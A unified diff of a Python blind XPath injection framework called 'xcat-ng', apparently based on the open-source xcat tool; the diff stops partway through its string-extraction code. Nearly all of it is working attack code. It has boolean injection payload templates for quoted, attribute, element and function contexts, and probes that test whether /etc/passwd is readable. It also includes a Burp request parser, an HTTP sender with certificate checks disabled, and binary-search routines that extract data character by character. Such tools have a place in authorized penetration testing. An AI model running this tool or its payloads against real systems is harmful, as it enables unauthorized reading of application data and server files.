@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-"""xcat-ng  --  Modern XPath Injection Framework (next-generation)"""
+"""xcat-ng — Modern XPath Injection Framework"""
+# Based on xcat by Tom Forbes (https://github.com/orf/xcat)
 
 from __future__ import annotations
 
@@ -9,109 +10,99 @@ import collections
 import importlib.util
 import math
 import re
-import readline  # noqa: F401 — enables arrow-key history in shell
+import readline   # noqa: F401 — enables arrow-key history in shell
 import shlex
-import statistics
 import sys
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Callable, Dict, List, Optional, Tuple
-from urllib.parse import parse_qs, urlparse
-
-import difflib
+from urllib.parse import parse_qs, urlencode, urlparse
 
 try:
     import httpx
 except ImportError:
-    sys.exit("[!] pip install httpx")
+    sys.exit("[!] Missing dependency: pip install httpx")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Terminal colours
+# Colours
 # ══════════════════════════════════════════════════════════════════════════════
 
-class T:
-    RESET   = "\033[0m"
-    BOLD    = "\033[1m"
-    DIM     = "\033[2m"
-    RED     = "\033[91m"
-    GREEN   = "\033[92m"
-    YELLOW  = "\033[93m"
-    BLUE    = "\033[94m"
-    CYAN    = "\033[96m"
-    GRAY    = "\033[90m"
+class C:
+    RST  = "\033[0m"
+    BOLD = "\033[1m"
+    RED  = "\033[91m"
+    GRN  = "\033[92m"
+    YLW  = "\033[93m"
+    BLU  = "\033[94m"
+    CYN  = "\033[96m"
+    GRY  = "\033[90m"
 
+def _c(s: str, *codes: str) -> str:
+    return "".join(codes) + str(s) + C.RST
 
-def _c(text: str, *codes: str) -> str:
-    return "".join(codes) + text + T.RESET
+def info(m: str): print(_c(f"[*] {m}", C.BLU))
+def ok(m: str):   print(_c(f"[+] {m}", C.GRN))
+def warn(m: str): print(_c(f"[!] {m}", C.YLW))
+def err(m: str):  print(_c(f"[-] {m}", C.RED))
 
-
-def info(m: str):  print(_c(f"[*] {m}", T.BLUE))
-def ok(m: str):    print(_c(f"[+] {m}", T.GREEN))
-def warn(m: str):  print(_c(f"[!] {m}", T.YELLOW))
-def err(m: str):   print(_c(f"[-] {m}", T.RED))
-
-_verbose = False
+VERBOSE = False
 def dbg(m: str):
-    if _verbose:
-        print(_c(f"[D] {m}", T.GRAY))
+    if VERBOSE:
+        print(_c(f"[D] {m}", C.GRY), file=sys.stderr)
 
 
-BANNER = (
-    _c("\n ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗", T.CYAN, T.BOLD) + "\n" +
-    _c(" ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝", T.CYAN, T.BOLD) + "\n" +
-    _c("  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗", T.CYAN, T.BOLD) + "\n" +
-    _c("  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║", T.CYAN, T.BOLD) + "\n" +
-    _c(" ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝", T.CYAN, T.BOLD) + "\n" +
-    _c(" ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝", T.CYAN, T.BOLD) + "\n" +
-    _c(" Modern XPath Injection Framework  (next-generation)\n", T.YELLOW)
-)
+BANNER = """\033[96m\033[1m
+ ██╗  ██╗ ██████╗ █████╗ ████████╗      ███╗   ██╗ ██████╗
+ ╚██╗██╔╝██╔════╝██╔══██╗╚══██╔══╝      ████╗  ██║██╔════╝
+  ╚███╔╝ ██║     ███████║   ██║   █████╗██╔██╗ ██║██║  ███╗
+  ██╔██╗ ██║     ██╔══██║   ██║   ╚════╝██║╚██╗██║██║   ██║
+ ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝
+ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝\033[0m
+\033[93m Modern XPath Injection Framework  (next-generation)\033[0m
+"""
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Constants
+# Constants  (from original xcat)
 # ══════════════════════════════════════════════════════════════════════════════
 
-DEFAULT_TIMEOUT     = 15
-DEFAULT_CONCURRENCY = 10
-FAST_MODE_LEN       = 15
-MISSING_CHAR        = "?"
-
-# Frequency-ordered charset for linear search (most common English chars first)
-# Apostrophe excluded — breaks XPath substring-before() string literals.
-# It is added separately in ASCII_SEARCH_SPACE for the linear fallback.
+# Original xcat ASCII_SEARCH_SPACE — used for substring-before() search
+# Note: apostrophe excluded because it breaks XPath string literals.
+# It is included in FULL_CHARSET for the linear fallback (handled via quote-swap).
 ASCII_SEARCH_SPACE = (
-    "etaoinshrdlcumwfgypbvkjxqz"
-    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
-    "0123456789"
+    "0123456789abcdefghijklmnopqrstuvwxyz"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     "+./:@_ -,()!"
 )
-# Full charset used only in linear scan (apostrophe handled via quote-swap)
-ASCII_SEARCH_SPACE_FULL = ASCII_SEARCH_SPACE + "'"
+FULL_CHARSET = ASCII_SEARCH_SPACE + "'"
+
+MISSING_CHAR   = "?"
+DEFAULT_CONCURRENCY = 10
+DEFAULT_TIMEOUT     = 15
+FAST_MODE_LEN       = 15
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Injection templates
+# Injection templates  (from original xcat injections.py — exact same payloads)
 # ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass(frozen=True)
 class Injection:
-    """
-    Mirrors original xcat Injection.
-    test_payloads: list of (payload_template, expected_bool)
-    expr_template: string template or callable for wrapping an XPath expression
-    """
-    name:      str
-    example:   str
-    # list of (template_with_{working}, expected_result)
-    tests:     Tuple[Tuple[str, bool], ...]
-    # template string "{working} and {expression} ..." or callable(working, expr)
-    expr_tmpl: object  # str | Callable[[str, str], str]
+    name:    str
+    example: str
+    # test_templates: list of (payload_template, expected_bool)
+    # {working} is replaced with the current parameter value
+    tests:   Tuple[Tuple[str, bool], ...]
+    # expr_template: how to wrap an XPath expression into a payload
+    # either a format string with {working} and {expression},
+    # or a callable(working, expression) -> str
+    expr:    object  # str | Callable
 
-    def wrap(self, working: str, expression: str) -> str:
-        if callable(self.expr_tmpl):
-            return self.expr_tmpl(working, expression)
-        return self.expr_tmpl.format(working=working, expression=expression)
+    def make_payload(self, working: str, expression: str) -> str:
+        if callable(self.expr):
+            return self.expr(working, expression)
+        return self.expr.format(working=working, expression=expression)
 
     def test_payloads(self, working: str) -> List[Tuple[str, bool]]:
         return [(t.format(working=working), expected) for t, expected in self.tests]
@@ -125,7 +116,7 @@ INJECTIONS: List[Injection] = [
             ("{working} and 1=1", True),
             ("{working} and 1=2", False),
         ),
-        expr_tmpl = "{working} and {expression}",
+        expr = "{working} and {expression}",
     ),
     Injection(
         name    = "string - single quote",
@@ -134,7 +125,7 @@ INJECTIONS: List[Injection] = [
             ("{working}' and '1'='1", True),
             ("{working}' and '1'='2", False),
         ),
-        expr_tmpl = "{working}' and {expression} and '1'='1",
+        expr = "{working}' and {expression} and '1'='1",
     ),
     Injection(
         name    = "string - double quote",
@@ -143,134 +134,131 @@ INJECTIONS: List[Injection] = [
             ('{working}" and "1"="1', True),
             ('{working}" and "1"="2', False),
         ),
-        expr_tmpl = '{working}" and {expression} and "1"="1',
+        expr = '{working}" and {expression} and "1"="1',
     ),
     Injection(
-        name    = "string - single quote (trailing close)",
+        name    = "string - single quote (closing paren)",
         example = "/lib/book[name='?')]",
         tests   = (
             ("{working}') and ('1'='1", True),
             ("{working}') and ('1'='2", False),
         ),
-        expr_tmpl = "{working}') and {expression} and ('1'='1",
+        expr = "{working}') and {expression} and ('1'='1",
     ),
     Injection(
-        name    = "string - double quote (trailing close)",
-        example = '/lib/book[name="?")]',
+        name    = "string - double quote (closing paren)",
+        example = '/lib/book[fn("?")]',
         tests   = (
             ('{working}") and ("1"="1', True),
             ('{working}") and ("1"="2', False),
         ),
-        expr_tmpl = '{working}") and {expression} and ("1"="1',
+        expr = '{working}") and {expression} and ("1"="1',
     ),
     Injection(
-        name    = "attribute name - prefix",
+        name    = "attribute - prefix",
         example = "/lib/book[?=value]",
         tests   = (
             ("1=1 and {working}", True),
             ("1=2 and {working}", False),
         ),
-        expr_tmpl = lambda w, e: f"{e} and {w}",
+        expr = lambda w, e: f"{e} and {w}",
     ),
     Injection(
-        name    = "attribute name - postfix",
+        name    = "attribute - postfix",
         example = "/lib/book[value=?]",
         tests   = (
             ("{working} and not 1=2 and {working}", True),
             ("{working} and 1=2 and {working}",     False),
         ),
-        expr_tmpl = lambda w, e: f"{w} and {e} and {w}",
+        expr = lambda w, e: f"{w} and {e} and {w}",
     ),
     Injection(
-        name    = "element name - postfix",
+        name    = "element - postfix",
         example = "/lib/?something",
         tests   = (
             ("{working}[true()]",  True),
             ("{working}[false()]", False),
         ),
-        expr_tmpl = lambda w, e: f"{w}[{e}]",
+        expr = lambda w, e: f"{w}[{e}]",
     ),
     Injection(
         name    = "function call - single quote",
-        example = "/lib/something[function(?)]",
+        example = "/lib/something[fn(?)]",
         tests   = (
             ("{working}') and true() and string('1'='1",  True),
             ("{working}') and false() and string('1'='1", False),
         ),
-        expr_tmpl = "{working}') and {expression} and string('1'='1",
+        expr = "{working}') and {expression} and string('1'='1",
     ),
     Injection(
         name    = "function call - double quote",
-        example = '/lib/something[function(?)]',
+        example = "/lib/something[fn(?)]",
         tests   = (
             ('{working}") and true() and string("1"="1',  True),
             ('{working}") and false() and string("1"="1', False),
         ),
-        expr_tmpl = '{working}") and {expression} and string("1"="1',
+        expr = '{working}") and {expression} and string("1"="1',
     ),
 ]
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Features  (mirrors original xcat features.py)
+# Features  (from original xcat features.py)
 # ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass(frozen=True)
 class Feature:
-    name:        str
-    # XPath expressions that must ALL be true for the feature to be present
-    tests:       Tuple[str, ...]
-    description: str = ""
+    name:  str
+    desc:  str
+    # All XPath expressions must evaluate to true for feature to be present
+    tests: Tuple[str, ...]
 
 
 FEATURES: List[Feature] = [
-    Feature("xpath-2", (
+    Feature("xpath-2", "XPath 2.0", (
         "lower-case('A')='a'",
-        "ends-with('thetest','test')",
+        "ends-with('test','st')",
         "encode-for-uri('test')='test'",
-    ), "XPath 2.0"),
-    Feature("xpath-3", (
+    )),
+    Feature("xpath-3", "XPath 3.0", (
         "boolean(generate-id(/))",
-    ), "XPath 3.0"),
-    Feature("xpath-3.1", (
-        "contains-token('a','a')",
-    ), "XPath 3.1"),
-    Feature("normalize-space", (
+    )),
+    Feature("normalize-space", "normalize-space()", (
         "normalize-space('  a  b ')='a b'",
-    ), "normalize-space()"),
-    Feature("substring-search", (
-        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','h'))={ASCII_SEARCH_SPACE.find('h')}",
-        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','o'))={ASCII_SEARCH_SPACE.find('o')}",
-    ), "substring-before() char search"),
-    Feature("codepoint-search", (
+    )),
+    Feature("substring-search", "substring-before() char search", (
+        f"string-length(substring-before('{ASCII_SEARCH_SPACE}','h'))="
+        f"{ASCII_SEARCH_SPACE.find('h')}",
+    )),
+    Feature("codepoint-search", "string-to-codepoints() (XPath 2.0)", (
         "string-to-codepoints('test')[1]=116",
-    ), "string-to-codepoints() char search"),
-    Feature("environment-variables", (
+    )),
+    Feature("environment-variables", "available-environment-variables()", (
         "exists(available-environment-variables())",
-    ), "available-environment-variables()"),
-    Feature("document-uri", (
+    )),
+    Feature("document-uri", "document-uri()", (
         "string-length(document-uri(/))>0",
-    ), "document-uri()"),
-    Feature("base-uri", (
+    )),
+    Feature("base-uri", "base-uri()", (
         "string-length(base-uri())>0",
-    ), "base-uri()"),
-    Feature("current-datetime", (
+    )),
+    Feature("current-datetime", "current-dateTime()", (
         "string-length(string(current-dateTime()))>0",
-    ), "current-dateTime()"),
-    Feature("unparsed-text", (
+    )),
+    Feature("unparsed-text", "unparsed-text() / file reading", (
         "unparsed-text-available(document-uri(/))",
-    ), "unparsed-text()"),
-    Feature("doc-function", (
+    )),
+    Feature("doc-function", "doc() / doc-available()", (
         "doc-available(document-uri(/))",
-    ), "doc()"),
-    Feature("linux", (
+    )),
+    Feature("linux", "Linux (/etc/passwd readable)", (
         "unparsed-text-available('/etc/passwd')",
-    ), "Linux OS"),
+    )),
 ]
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Request parsing
+# Burp request parser
 # ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass
@@ -278,23 +266,27 @@ class ParsedRequest:
     method:  str
     url:     str
     headers: Dict[str, str]
-    params:  Dict[str, str]   # query string params
-    body:    Dict[str, str]   # POST body params
+    params:  Dict[str, str]   # query string
+    body:    Dict[str, str]   # POST body (form-encoded)
 
     @property
     def all_params(self) -> Dict[str, str]:
+        """All parameters (query + body) in one dict."""
         return {**self.params, **self.body}
 
     @classmethod
     def from_burp(cls, path: str) -> "ParsedRequest":
         text  = Path(path).read_text(errors="replace")
         lines = text.splitlines()
+        if not lines:
+            sys.exit(f"[-] Empty request file: {path}")
 
         m = re.match(r"^(\w+)\s+(\S+)\s+HTTP/", lines[0])
         if not m:
             sys.exit(f"[-] Cannot parse request line: {lines[0]!r}")
 
-        method, path_qs = m.group(1).upper(), m.group(2)
+        method   = m.group(1).upper()
+        path_qs  = m.group(2)
         headers: Dict[str, str] = {}
         i = 1
         while i < len(lines) and lines[i].strip():
@@ -302,10 +294,10 @@ class ParsedRequest:
                 k, _, v = lines[i].partition(":")
                 headers[k.strip()] = v.strip()
             i += 1
-        raw_body = "\n".join(lines[i + 1:]).strip()
+        raw_body = "\n".join(lines[i+1:]).strip()
 
         host   = headers.get("Host", "localhost")
-        scheme = "https" if "443" in host else "http"
+        scheme = "https" if ":443" in host or host.endswith(":443") else "http"
         parsed = urlparse(f"{scheme}://{host}{path_qs}")
         params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
 
@@ -313,22 +305,19 @@ class ParsedRequest:
         ct = headers.get("Content-Type", "")
         if raw_body and "application/x-www-form-urlencoded" in ct:
             body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
+        elif raw_body and not body:
+            # Try to parse anyway if it looks like form data
+            try:
+                body = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}
+            except Exception:
+                pass
 
-        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match"):
+        for drop in ("Accept-Encoding", "Content-Length", "If-None-Match",
+                     "Cache-Control", "Pragma"):
             headers.pop(drop, None)
 
         base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
         return cls(method=method, url=base, headers=headers, params=params, body=body)
-
-    @classmethod
-    def from_args(cls, url: str, method: str,
-                  params: Dict[str, str], headers: Dict[str, str],
-                  body: Dict[str, str]) -> "ParsedRequest":
-        parsed = urlparse(url)
-        q = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
-        q.update(params)
-        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-        return cls(method=method, url=base, headers=headers, params=q, body=body)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -336,66 +325,70 @@ class ParsedRequest:
 # ══════════════════════════════════════════════════════════════════════════════
 
 @dataclass
-class AttackContext:
+class Ctx:
+    """
+    Mutable attack context. Holds everything needed during an attack.
+    Mirrors original xcat AttackContext but as a dataclass (mutable).
+    """
     req:          ParsedRequest
-    target_param: str
-    match_fn:     Callable[[int, str], bool]
+    target_param: str                        # which parameter to inject
+    match_fn:     Callable[[int, str], bool] # oracle
     concurrency:  int
     fast_mode:    bool
     timeout:      int
     proxy:        Optional[str]
-    injection:    Optional[Injection]          = None
-    tamper_fn:    Optional[Callable]           = None
-    features:     Dict[str, bool]              = field(default_factory=dict)
-    # Cached most-common chars/strings — speeds up repeated extractions
-    common_chars: collections.Counter          = field(default_factory=collections.Counter)
-    common_strs:  collections.Counter          = field(default_factory=collections.Counter)
-    _client:      Optional[httpx.AsyncClient]  = field(default=None, repr=False)
-    _sem:         Optional[asyncio.Semaphore]  = field(default=None, repr=False)
+    injection:    Optional[Injection]        = None
+    tamper_fn:    Optional[Callable]         = None
+    features:     Dict[str, bool]            = field(default_factory=dict)
+    # frequency caches — speed up repeated char/string lookups
+    common_chars: collections.Counter        = field(default_factory=collections.Counter)
+    common_strs:  collections.Counter        = field(default_factory=collections.Counter)
+    _client:      Optional[httpx.AsyncClient] = field(default=None, repr=False)
+    _sem:         Optional[asyncio.Semaphore] = field(default=None, repr=False)
 
     async def start(self):
-        proxies = {"all://": self.proxy} if self.proxy else None
-        self._client = httpx.AsyncClient(timeout=self.timeout, verify=False, proxies=proxies)
+        kw: Dict = dict(timeout=self.timeout, verify=False)
+        if self.proxy:
+            kw["proxies"] = {"all://": self.proxy}
+        self._client = httpx.AsyncClient(**kw)
         self._sem    = asyncio.Semaphore(self.concurrency)
 
     async def close(self):
         if self._client:
             await self._client.aclose()
 
-    @property
-    def working_value(self) -> str:
-        """Current value of the target parameter — used as injection base."""
-        return self.req.all_params.get(self.target_param, "")
-
     def has(self, feature: str) -> bool:
         return self.features.get(feature, False)
 
+    @property
+    def working_value(self) -> str:
+        """Current value of the injected parameter."""
+        return self.req.all_params.get(self.target_param, "")
+
     def ordered_chars(self) -> str:
-        """ASCII_SEARCH_SPACE ordered by observed frequency."""
+        """Charset ordered by observed frequency (speeds up linear scan)."""
         seen = sorted(self.common_chars, key=lambda c: -self.common_chars[c])
-        tail = [c for c in ASCII_SEARCH_SPACE_FULL if c not in self.common_chars]
-        return "".join(seen) + "".join(tail)
+        rest = [c for c in FULL_CHARSET if c not in self.common_chars]
+        return "".join(seen) + "".join(rest)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# HTTP  (send requests, check oracle)
+# HTTP
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def _send(ctx: AttackContext, overrides: Dict[str, str]) -> Tuple[int, str]:
-    import random
+async def _send(ctx: Ctx, param_overrides: Dict[str, str]) -> Tuple[int, str]:
+    """Send HTTP request with given parameter values substituted in."""
     q = dict(ctx.req.params)
     b = dict(ctx.req.body)
-    for k, v in overrides.items():
-        if k in q:   q[k] = v
-        else:         b[k] = v
-    # Cache buster
-    q["_xcng"] = str(random.randint(10000, 99999))
+    for k, v in param_overrides.items():
+        if k in q:  q[k] = v
+        else:       b[k] = v
 
-    kw = dict(headers=ctx.req.headers)
-    if ctx.req.method.upper() in ("GET", "HEAD", "DELETE"):
-        kw["params"] = q
+    if ctx.req.method.upper() in ("GET", "DELETE", "HEAD"):
+        kw = dict(params=q, headers=ctx.req.headers)
     else:
-        kw["data"] = {**q, **b} if b else q
+        merged = {**q, **b}
+        kw = dict(data=merged, headers=ctx.req.headers)
 
     if ctx.tamper_fn:
         ctx.tamper_fn(ctx, kw)
@@ -404,78 +397,83 @@ async def _send(ctx: AttackContext, overrides: Dict[str, str]) -> Tuple[int, str
         try:
             r = await ctx._client.request(ctx.req.method, ctx.req.url, **kw)
             return r.status_code, r.text
-        except Exception as exc:
-            dbg(f"request error: {exc}")
+        except Exception as e:
+            dbg(f"request error: {e}")
             return 0, ""
 
 
-async def send_payload(ctx: AttackContext, param: str, payload: str) -> Tuple[int, str]:
-    """Send a raw payload for a specific parameter."""
-    return await _send(ctx, {param: payload})
-
-
-async def check(ctx: AttackContext, expression: str) -> bool:
+async def check(ctx: Ctx, expression: str) -> bool:
     """
     Core oracle — mirrors original xcat check().
-    Wraps expression into injection payload, sends request, returns match result.
+    Wraps XPath expression into injection payload, sends, checks match function.
     """
-    payload = ctx.injection.wrap(ctx.working_value, expression)
-    st, body = await send_payload(ctx, ctx.target_param, payload)
-    return ctx.match_fn(st, body)
+    payload = ctx.injection.make_payload(ctx.working_value, expression)
+    status, body = await _send(ctx, {ctx.target_param: payload})
+    result = ctx.match_fn(status, body)
+    dbg(f"check({expression!r}) payload={payload!r} → {result}")
+    return result
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# Detection
+# Injection detection  (mirrors original xcat detect_injections exactly)
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def detect_injections(ctx: AttackContext, param: str) -> List[Injection]:
+async def _test_injection(ctx: Ctx, param: str, inj: Injection) -> bool:
     """
-    Mirrors original xcat detect_injections():
-    For each injector, send all test payloads and check if results match expectations.
-    Returns list of all working injectors (usually just one).
+    Test one injector on one parameter.
+    Sends all test payloads; returns True if ALL results match expectations.
+    Exact logic from original xcat.
     """
     working = ctx.req.all_params.get(param, "")
-    results = []
-
-    for inj in INJECTIONS:
-        payloads = inj.test_payloads(working)
-        checks   = await asyncio.gather(*[
-            _oracle_raw(ctx, param, pl, expected)
-            for pl, expected in payloads
-        ])
-        if all(checks):
-            dbg(f"  injection confirmed: {inj.name!r} on param={param!r}")
-            results.append(inj)
-
-    return results
+    payloads = inj.test_payloads(working)
+    results  = await asyncio.gather(*[
+        _check_raw(ctx, param, payload)
+        for payload, _ in payloads
+    ])
+    ok_list = [got == expected for got, (_, expected) in zip(results, payloads)]
+    dbg(f"  {inj.name!r} on {param!r}: {ok_list}")
+    return all(ok_list)
 
 
-async def _oracle_raw(ctx: AttackContext, param: str,
-                      payload: str, expected: bool) -> bool:
-    """Send a raw test payload and check if result matches expected bool."""
-    st, body = await send_payload(ctx, param, payload)
-    got = ctx.match_fn(st, body)
-    return got == expected
+async def _check_raw(ctx: Ctx, param: str, payload: str) -> bool:
+    """Send a raw payload (no injection wrapping) and check oracle."""
+    status, body = await _send(ctx, {param: payload})
+    return ctx.match_fn(status, body)
 
 
-async def auto_discover(ctx: AttackContext) -> Optional[Tuple[str, Injection]]:
+async def detect_injections(ctx: Ctx, param: str) -> List[Injection]:
     """
-    Try all parameters in order until a working injection is found.
-    If --param was specified, only that parameter is tested.
-    Returns (param, injection) or None.
+    Test all injectors on a parameter.
+    Returns list of working injectors (mirrors original xcat detect_injections).
+    """
+    hits = []
+    for inj in INJECTIONS:
+        if await _test_injection(ctx, param, inj):
+            hits.append(inj)
+    return hits
+
+
+async def auto_discover(ctx: Ctx) -> Optional[Tuple[str, Injection]]:
+    """
+    Added vs original xcat: probe ALL parameters automatically.
+    If ctx.target_param is set, only that parameter is tested.
+    Returns (param_name, injection) or None.
     """
     params = ctx.req.all_params
+    if not params:
+        err("No parameters found in request.")
+        return None
 
     if ctx.target_param and ctx.target_param in params:
         ranked = [ctx.target_param]
     else:
-        # Prefer string (non-numeric) params, longer values first
+        # Prefer non-numeric params, longer values first
         ranked = sorted(params, key=lambda k: (params[k].isdigit(), -len(params[k])))
-
-    info(f"Testing {len(ranked)} parameter(s): {', '.join(_c(p, T.CYAN) for p in ranked)}")
+        if not ctx.target_param:
+            warn(f"No --param specified, probing all {len(ranked)} parameter(s)")
 
     for param in ranked:
-        info(f"  Probing: {_c(param, T.CYAN)}")
+        info(f"  Probing: {_c(param, C.CYN)}")
         hits = await detect_injections(ctx, param)
         if hits:
             return param, hits[0]
@@ -483,42 +481,43 @@ async def auto_discover(ctx: AttackContext) -> Optional[Tuple[str, Injection]]:
     return None
 
 
-async def detect_features(ctx: AttackContext) -> Dict[str, bool]:
-    """
-    Mirrors original xcat detect_features():
-    Test each feature — all its XPath expressions must evaluate to true.
-    """
-    results: Dict[str, bool] = {}
+# ══════════════════════════════════════════════════════════════════════════════
+# Feature detection  (mirrors original xcat detect_features)
+# ══════════════════════════════════════════════════════════════════════════════
+
+async def detect_features(ctx: Ctx) -> Dict[str, bool]:
+    """Test each feature. All its XPath expressions must be true."""
+    result: Dict[str, bool] = {}
 
     async def probe(feat: Feature):
         checks = await asyncio.gather(*[check(ctx, expr) for expr in feat.tests])
-        results[feat.name] = all(checks)
+        result[feat.name] = all(checks)
 
     await asyncio.gather(*[probe(f) for f in FEATURES])
 
     for feat in FEATURES:
-        val  = results.get(feat.name, False)
-        icon = _c("✓", T.GREEN) if val else _c("✗", T.RED)
-        print(f"  {icon} {feat.name:<32} {_c(feat.description, T.GRAY)}")
+        v    = result.get(feat.name, False)
+        icon = _c("✓", C.GRN) if v else _c("✗", C.RED)
+        print(f"  {icon} {feat.name:<32} {_c(feat.desc, C.GRY)}")
 
-    return results
+    return result
 
 
 # ══════════════════════════════════════════════════════════════════════════════
 # Algorithms  (mirrors original xcat algorithms.py)
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def binary_search(ctx: AttackContext, expression: str,
-                        lo: int = 0, hi: int = 25, _depth: int = 0) -> int:
+async def binary_search(ctx: Ctx, expression: str,
+                        lo: int = 0, hi: int = 25,
+                        _depth: int = 0) -> int:
     """
     Mirrors original xcat binary_search().
-    Finds integer value of a numeric XPath expression.
+    Finds the integer value of a numeric XPath expression.
     """
-    if _depth > 14:
+    if _depth > 12:
         return -1
     if await check(ctx, f"({expression}) > {hi}"):
         return await binary_search(ctx, expression, lo, hi * 2, _depth + 1)
-
     while lo <= hi:
         mid = (lo + hi) // 2
         if await check(ctx, f"({expression}) < {mid}"):
@@ -530,87 +529,89 @@ async def binary_search(ctx: AttackContext, expression: str,
     return -1
 
 
-async def _count(ctx: AttackContext, expression: str) -> int:
-    result = await binary_search(ctx, f"count({expression})", lo=0)
-    return max(0, result)
+async def count(ctx: Ctx, expression: str) -> int:
+    """Count nodes — mirrors original xcat count()."""
+    r = await binary_search(ctx, f"count({expression})", lo=0)
+    return max(0, r)
 
 
-async def _string_length(ctx: AttackContext, expression: str) -> int:
-    result = await binary_search(ctx, f"string-length({expression})", lo=0)
-    if result < 0 or result > 4096:
+async def string_length(ctx: Ctx, expression: str) -> int:
+    r = await binary_search(ctx, f"string-length({expression})", lo=0)
+    if r < 0 or r > 4096:
         return 0
-    return result
+    return r
 
 
-# ── character search strategies (mirrors original xcat algorithms.py) ──────
+# ── character extraction strategies  (mirrors original xcat algorithms.py) ──
 
-async def _codepoint_search(ctx: AttackContext, expression: str) -> Optional[str]:
-    """O(log N) via string-to-codepoints (XPath 2.0)."""
-    code = await binary_search(ctx, f"string-to-codepoints({expression})[1]", lo=0, hi=255)
+async def _codepoint_search(ctx: Ctx, expr: str) -> Optional[str]:
+    """O(log N) — string-to-codepoints(), XPath 2.0."""
+    code = await binary_search(ctx, f"string-to-codepoints({expr})[1]", lo=0, hi=255)
     return chr(code) if code > 0 else None
 
 
-async def _substring_search(ctx: AttackContext, expression: str) -> Optional[str]:
+async def _substring_search(ctx: Ctx, expr: str) -> Optional[str]:
     """
-    O(log N) via substring-before on ASCII_SEARCH_SPACE.
+    O(log N) — substring-before() on ASCII_SEARCH_SPACE.
     Mirrors original xcat substring_search().
-    Note: first char needs explicit check (substring-before returns "" for both
-    "not found" and "found at position 0").
+    First char needs explicit check: substring-before returns "" for both
+    "not found" and "is the first character".
     """
     space = ASCII_SEARCH_SPACE
-    if await check(ctx, f"{expression}='{space[0]}'"):
+    if await check(ctx, f"{expr}='{space[0]}'"):
         return space[0]
     idx = await binary_search(
         ctx,
-        f"string-length(substring-before('{space}',{expression}))",
-        lo=0, hi=len(space)
+        f"string-length(substring-before('{space}',{expr}))",
+        lo=0, hi=len(space),
     )
     return space[idx] if 0 < idx < len(space) else None
 
 
-async def _linear_search(ctx: AttackContext, expression: str) -> Optional[str]:
-    """O(N) frequency-ordered linear scan. Fallback for XPath 1.0."""
+async def _linear_search(ctx: Ctx, expr: str) -> Optional[str]:
+    """
+    O(N) frequency-ordered linear scan — mirrors original xcat "dumb search".
+    Fallback for XPath 1.0 (no codepoint or substring-before features).
+    """
     for ch in ctx.ordered_chars():
         q = '"' if ch == "'" else "'"
-        if await check(ctx, f"{expression}={q}{ch}{q}"):
+        if await check(ctx, f"{expr}={q}{ch}{q}"):
             ctx.common_chars[ch] += 1
             return ch
     return None
 
 
-async def get_char(ctx: AttackContext, expression: str) -> Optional[str]:
-    """Pick the best character search strategy based on detected features."""
+async def get_char(ctx: Ctx, expr: str) -> Optional[str]:
+    """Pick best char extraction strategy by detected features."""
     if ctx.has("codepoint-search"):
-        return await _codepoint_search(ctx, expression)
+        return await _codepoint_search(ctx, expr)
     if ctx.has("substring-search"):
-        return await _substring_search(ctx, expression)
-    return await _linear_search(ctx, expression)
+        return await _substring_search(ctx, expr)
+    return await _linear_search(ctx, expr)
 
 
 # ── progress bar ─────────────────────────────────────────────────────────────
 
 def _progress(done: int, total: int, partial: str):
-    """Live progress bar on stderr — keeps stdout clean for XML output."""
     bar_w  = 28
     filled = int(bar_w * done / total) if total else 0
     bar    = "█" * filled + "░" * (bar_w - filled)
     print(
-        f"\r [{T.CYAN}{bar}{T.RESET}] {done}/{total}  {T.GREEN}{partial}{T.RESET}",
+        f"\r [{C.CYN}{bar}{C.RST}] {done}/{total}  {C.GRN}{partial}{C.RST}",
         end="", flush=True, file=sys.stderr,
     )
 
 
-# ── string extraction ─────────────────────────────────────────────────────────
+# ── string extraction  (mirrors original xcat get_string()) ─────────────────
 
-async def _get_common_string(ctx: AttackContext,
-                             expression: str, length: int) -> Optional[str]:
-    """Try previously seen strings of the same length before char-by-char."""
+async def _try_common_string(ctx: Ctx, expr: str, length: int) -> Optional[str]:
+    """Try cached common strings before char-by-char (mirrors original xcat)."""
     if length >= 10:
         return None
     candidates = [s for s, _ in ctx.common_strs.most_common() if len(s) == length][:5]
     if not candidates:
         return None
-    hits = await asyncio.gather(*[check(ctx, f"{expression}='{c}'") for c in candidates])
+    hits = await asyncio.gather(*[check(ctx, f"{expr}='{c}'") for c in candidates])
     for hit, s in zip(hits, candidates):
         if hit:
             ctx.common_strs[s] += 1
